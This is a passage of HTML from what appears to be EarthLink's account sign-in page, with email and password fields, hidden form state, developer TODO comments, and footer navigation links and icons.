jxW4Zvrw7ypTpAboxIhkkCeLFAyfEtwXgJJReRjK1KzksEDDdL0U7otGM03Lgfo7DVaN3HBPsUqUNfsyF12TQz7Id6Xf7SGAR3OVzaDTAPp7pSjdu428fwTgeKDOX4A068DcVMDoYnLK0ha9L-Wf4QtXGdBfPYuqsi83boHXqIhsHWf1dmZT_vfABOMsjh2P6nq8j5tPfKAEGie5bQKBGwZnHHsqlLxEoRjQFQzwlr4YbTvIxHHVqNJIq6XEvwDG-Fjs3VFCjwYeRc8xpmXD6fAjbupqgJLrSFSal7huAwb61X6NPxgViXVSHrl1wK3FizIQjQC5-2I-5vnaN09w2xpYrC7qS5k_HXDLkWMAa0Yiep29-JUBbNoqjoJ0a3Ow4vpYzID3lH0YLcTr7Czh6OMy5nBR86G9h-3tB9nslBUFpgWFchmzgIiaBc3N06Bu2o5K8Di6Ak_i6teGvyVU8PrWbhu0UzzFKHe895yK1R_-fjH45vIdO1wvm1YQlwAODFcInRYjbbH3Zs1opqYAAdMKbreEC2urKA6UHjZaC4xGFum4sXZif-Qs5qILc7YxRfu7eOCub4dJj1t74ejIisUaFnAJTm2Ozgc0KFxm66aikl59SFoo-1vt4YtS9AEGztx0RojUTsVPULcIPPntlgGdooUKC3eeY1UlOLFol9mAxOx2_Ol3dOP09XC2EQOAxnuEyPQrgiyWRrM="><input type="hidden" name="state" value="password"><input type="hidden" name="mfa"><table style="margin-bottom: 15px;"><!-- TODO: (LEG2-6775) replace email input with hidden input when webmail be ready for userId state--><!--input(type="hidden", name="email", value=email)--><tr><td><label class="label-div" for="email">Email Address:</label><input type="email" id="email" name="email" style="margin-top: 10px; margin-bottom: 10px;"><p class="hidden font-size-14" id="email-error-message" style="color:red;">This field is required.</p></td><td></td></tr><tr><td><label class="label-div" for="password">Password:</label><div class="password-input-wrapper"><input type="password" id="password" name="password" style="margin-top: 10px; margin-bottom: 10px;"><span class="password-toggle-icon" id="eye-icon"><i class="fa fa-eye-slash" aria-hidden="true"></i></span><p class="hidden font-size-14" id="password-error-message" style="color:red;">This field is required.</p></div></td><td></td></tr></table><!-- TODO: (LEG2-6775) remove this state (password) when webmail be ready for userId state--><div class="under-table-div display-flex align-items"><div class="display-flex align-items"><input class="checkbox-input font-size-14" type="checkbox" id="remember" name="remember" value="1"><label class="color-black font-size-14 font-weight-500" for="remember">Remember username</label></div><a class="link-color font-size-14" href="https://portal.earthlink.net/login/forgot-password/email" style="width=100%">Forgot your password?</a></div><br><div class="display-flex margin-top" style="justify-content: space-between;"><button class="button-background-color color-white cursor-pointer sign-in-button" type="submit" id="accept" name="submit" value="Sign In"><span id="button-text">Sign In</span><span class="hidden" id="spinner"><i class="fa fa-spinner fa-spin"></i></span></button></div><!-- TODO: (LEG2-6775) uncomment this when webmail be ready for userId state--><!--div(class="display-flex align-items justify-center", style='margin-top: 10px;')--><!--    a(href='https://portal.earthlink.net/login/forgot-password/email' class="link-color font-size-14" style="width=100%") Forgot password?--><!--br--><!-- TODO: (LEG2-6775) remove this when webmail be ready for userId state--><div class="display-flex" style="justify-content: space-between;"><a class="button-div" href="https://pay.earthlink.net/" target="_blank" style="width: 48%"><input class="button-background-color color-white cursor-pointer" type="button" value="Make a Payment"></a><a class="button-div" href="https://earthlink.net/about-us/contact" target="_blank" style="width: 48%"><input class="button-background-color color-white cursor-pointer" type="button" value="Support"></a></div></form></div></div></div><div><div class="desktop-footer footer-top"><div class="footer-ul-div "><h3 class="list-heading">Internet</h3><ul><li><a class="list-anchor" href="https://www.earthlink.net/internet/#/">High-Speed Internet</a></li><li><a class="list-anchor" href="https://www.earthlink.net/internet/fiber-internet">Fiber Internet</a></li><li><a class="list-anchor" href="https://www.earthlink.net/internet/wireless-home-internet">Wireless Home Internet</a></li><li><a class="list-anchor" href="https://www.earthlink.net/internet/satellite-internet">Satellite Internet</a></li><li><a class="list-anchor" href="https://www.earthlink.net/internet/rural-internet">Rural Internet</a></li><li><a class="list-anchor" href="https://www.earthlink.net/internet-near-me ">Internet Near Me</a></li></ul></div><div class="footer-ul-div "><h3 class="list-heading">EarthLink</h3><ul><li><a class="list-anchor" href="https://www.earthlink.net/about-us">About Us</a></li><li><a class="list-anchor" href="https://www.earthlink.net/about-us/contact">Contact</a></li><li><a class="list-anchor" href="https://www.earthlink.net/blog/">Blog</a></li><li><a class="list-anchor" href="https://www.earthlink.net/about-us/careers">Careers</a></li><li><a class="list-anchor" href="https://www.earthlink.net/tcs">Terms & Conditions</a></li></ul></div><div class="footer-ul-div "><h3 class="list-heading">Help</h3><ul><li><a class="list-anchor" href="https://help.earthlink.net/">Support</a></li><li><a class="list-anchor" href="https://www.earthlink.net/live-chat">Live Chat</a></li></ul><h3 class="list-heading" style="margin-top: 20px; margin-bottom: 10px;">Follow EarthLink</h3><ul class="display-flex"><li><a class="social-anchor" href="https://www.facebook.com/earthlink"><i class="fa fa-facebook social-icon" aria-hidden="true"></i></a></li><li><a class="social-anchor" href="https://twitter.com/earthlink"><i class="fa fa-twitter social-icon" aria-hidden="true"></i></a></li><li><a class="social-anchor" href="https://www.linkedin.com/company/earthlink-internet"><i class="fa fa-linkedin social-icon" aria-hidden="true"></i></a></li><li><a class="social-anchor" href="https://www.youtube.com/c/EarthLinkOrbit"><i class="fa fa-youtube-play social-icon" aria-hidden="true"></i></a></li></ul></div><div class="footer-ul-div "><h3 class="list-heading">Account</h3><ul><li><a class="list-anchor" href="https://portal.earthlink.net">My Account</a></li><li><a class="list-anchor" href="https://webmail1.earthlink.net">WebMail</a></li><li><a class="list-anchor" href="https://my.earthlink.net">My EarthLink</a></li></ul></div></div><div class="desktop-footer footer-bottom"><p class="list-anchor" style="text-decoration: none;">© 2025 EarthLink, LLC&nbsp;•&nbsp;All rights reserved</p><img src="data:image/png;base64,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" alt="footer logo"><div style="padding-right: 60px;"><a class="list-anchor" href="https://www.earthlink.net/tcs/privacy-policy">Privacy Policy &nbsp;</a><span style="color: rgb(255, 255, 255);"> • &nbsp;</span><a class="list-anchor" href="https://www.earthlink.net/tcs/interest-based-ads">Interest-Based Ads</a></div></div><footer class="mobile-footer bg-elnk-grey dark:bg-dt-secondary block laptop:hidden text-base"><div class="nav-wrapper w-full p-6"><nav class="mb-4 first"><div><button class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle" type="button"><span>Internet</span><span class="stroke-[2px] origin-center icon-wrapper"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="6 0 26 26"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" d="M15.786 18.572 21.357 13 15.786 7.43"></path></svg></span></button><div class="hidden footer-dropdown-content"><ul><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/internet/" target="_blank" rel="noreferrer">Internet</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/internet/fiber-internet/" target="_blank" rel="noreferrer">Fiber Internet</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/internet/wireless-home-internet/" target="_blank" rel="noreferrer">Wireless Home Internet</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/internet/business-internet/" target="_blank" rel="noreferrer">Business Internet</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/internet-near-me/" target="_blank" rel="noreferrer">Internet Near Me</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/internet/satellite-internet/" target="_blank" rel="noreferrer">Satellite Internet</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/internet/rural-internet/" target="_blank" rel="noreferrer">Rural Internet</a></li></ul></div></div><div><button class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle" type="button"><span>Resources</span><span class="stroke-[2px] origin-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="6 0 26 26"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" d="M15.786 18.572 21.357 13 15.786 7.43"></path></svg></span></button><div class="hidden footer-dropdown-content"><ul><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/resources/internet-speed-test/" target="_blank" rel="noreferrer">Internet Speed Test</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/resources/bandwidth-calculator/" target="_blank" rel="noreferrer">Bandwidth Calculator</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/resources/fiber-vs-cable-internet/" target="_blank" rel="noreferrer">Fiber vs. Cable</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/resources/ultimate-guide-to-the-internet/" target="_blank" rel="noreferrer">Ultimate Guide to the Internet</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/blog/" target="_blank" rel="noreferrer">Blog</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/resources/" target="_blank" rel="noreferrer">All Resources</a></li></ul></div></div><div><button class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle" type="button"><span>EarthLink</span><span class="stroke-[2px] origin-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="6 0 26 26"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" d="M15.786 18.572 21.357 13 15.786 7.43"></path></svg></span></button><div class="hidden footer-dropdown-content"><ul><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/about-us/" target="_blank" rel="noreferrer">About Us</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/about-us/contact/" target="_blank" rel="noreferrer">Contact</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/media/" target="_blank" rel="noreferrer">Media</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/about-us/partners/" target="_blank" rel="noreferrer">Partners</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/about-us/careers/" target="_blank" rel="noreferrer">Careers</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/tcs/" target="_blank" rel="noreferrer">Terms &amp;amp; Conditions</a></li></ul></div></div><div><button class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle" type="button"><span>Help</span><span class="stroke-[2px] origin-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="6 0 26 26"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" d="M15.786 18.572 21.357 13 15.786 7.43"></path></svg></span></button><div class="hidden footer-dropdown-content"><ul><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://help.earthlink.net/portal/en/home" target="_blank" rel="noreferrer">Support</a></li></ul></div></div><div><button class="flex w-full justify-between py-2 font-semibold text-white footer-dropdown-toggle" type="button"><span>Account</span><span class="stroke-[2px] origin-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="6 0 26 26"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" d="M15.786 18.572 21.357 13 15.786 7.43"></path></svg></span></button><div class="hidden footer-dropdown-content"><ul><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://portal.earthlink.net/account/" target="_blank" rel="noreferrer">My Account</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://webmail1.earthlink.net/login" target="_blank" rel="noreferrer">WebMail</a></li><li class="last:mb-2"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://my.earthlink.net/" target="_blank" rel="noreferrer">My EarthLink</a></li></ul></div></div></nav><nav class="second"><h4 class="mb-2 font-bold text-white">Follow EarthLink</h4><ul class="flex"><li class="mx-1 flex items-center justify-center rounded-full bg-white text-elnk-dark-grey"><a class="p-2" href="https://twitter.com/earthlink" target="_blank" rel="noreferrer" aria-label="Twitter"><span class="stroke-[1.5px]"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 22"><path fill="currentColor" d="M18.88 0h3.68l-8.08 9.336L23.92 22h-7.408l-5.8-7.696L4.072 22H.392l8.56-9.985L-.088 0h7.592l5.24 7.03L18.88 0Zm-1.288 19.808h2.04L6.432 2.111H4.24l13.352 17.697Z"></path></svg></span></a></li><li class="mx-1 flex items-center justify-center rounded-full bg-white text-elnk-dark-grey"><a class="p-2" href="https://www.facebook.com/earthlink" target="_blank" rel="noreferrer" aria-label="Facebook"><span class="stroke-[1.5px]"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#fff" viewBox="0 0 24 24"><path fill="currentColor" d="M17.525 9H14V7c0-1.032.084-1.682 1.563-1.682h1.868v-3.18A26.065 26.065 0 0 0 14.693 2C11.98 2 10 3.657 10 6.699V9H7v4l3-.001V22h4v-9.003l3.066-.001L17.525 9z"></path></svg></span></a></li><li class="mx-1 flex items-center justify-center rounded-full bg-white text-elnk-dark-grey"><a class="p-2" href="https://www.linkedin.com/company/earthlink" target="_blank" rel="noreferrer" aria-label="LinkedIn"><span class="stroke-[1.5px]"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#fff" viewBox="0 0 30 30"><path fill="currentColor" d="M9 25H4V10h5v15zM6.501 8a2.5 2.5 0 1 1 0-5.001A2.5 2.5 0 0 1 6.5 8zM27 25h-4.807v-7.3c0-1.741-.033-3.98-2.499-3.98-2.503 0-2.888 1.896-2.888 3.854V25H12V9.989h4.614v2.051h.065c.642-1.18 2.211-2.424 4.551-2.424 4.87 0 5.77 3.109 5.77 7.151V25z"></path></svg></span></a></li><li class="mx-1 flex items-center justify-center rounded-full bg-white text-elnk-dark-grey"><a class="p-2" href="https://www.youtube.com/c/EarthLinkOrbit" target="_blank" rel="noreferrer" aria-label="Youtube"><span class="stroke-[1.5px]"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#fff" viewBox="0 0 24 24"><path fill="currentColor" d="M21.582 6.186a2.506 2.506 0 0 0-1.768-1.768C18.254 4 12 4 12 4s-6.254 0-7.814.418c-.86.23-1.538.908-1.768 1.768C2 7.746 2 12 2 12s0 4.254.418 5.814c.23.86.908 1.538 1.768 1.768C5.746 20 12 20 12 20s6.254 0 7.814-.418a2.504 2.504 0 0 0 1.768-1.768C22 16.254 22 12 22 12s0-4.254-.418-5.814zM10 14.598V9.402a.5.5 0 0 1 .75-.433l4.5 2.598a.5.5 0 0 1 0 .866l-4.5 2.598a.5.5 0 0 1-.75-.433z"></path></svg></span></a></li></ul></nav></div><section class="flex flex-col items-center justify-center bg-elnk-dark-grey pt-5 text-sm text-white dark:bg-dt-background"><p>© Copyright 2025 EarthLink LLC</p><p>All rights reserved</p><div class="link-wrapper"><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/tcs/privacy-policy/" target="_blank" rel="noreferrer">Privacy Policy</a><i class="px-1">·</i><a class="hover:opacity-80 text-white underline dark:text-white" href="https://www.earthlink.net/tcs/interest-based-ads/" target="_blank" rel="noreferrer">Interest-Based Ads</a></div><div class="logo-wrapper pointer-events-none relative -mt-[30px] flex w-full justify-center overflow-hidden"><span class="stroke-[1.5px] translate-y-1/2"><svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="none" viewBox="0 0 34 31"><path fill="#F58B21" fill-rule="evenodd" d="M5.54 17.926a11.616 11.616 0 0 1-.307-2.646c0-6.444 5.251-11.667 11.728-11.667 1.578 0 3.083.311 4.457.874a56.153 56.153 0 0 1 3.613-2.207A15.338 15.338 0 0 0 16.961 0C8.478 0 1.601 6.841 1.601 15.28c0 2.062.414 4.027 1.157 5.821a59.925 59.925 0 0 1 2.782-3.175ZM30.901 8.898l-.044-.099a16.562 16.562 0 0 0-.47-.91c-.018-.03-.037-.058-.054-.088a.077.077 0 0 0 .01-.014 15.354 15.354 0 0 0-3.174-3.912 39.973 39.973 0 0 0-2.14 1.202c-.39.233-.794.483-1.207.746 2.947 2.12 4.868 5.563 4.868 9.457 0 6.444-5.251 11.668-11.729 11.668-4.581 0-8.54-2.62-10.47-6.428a67.086 67.086 0 0 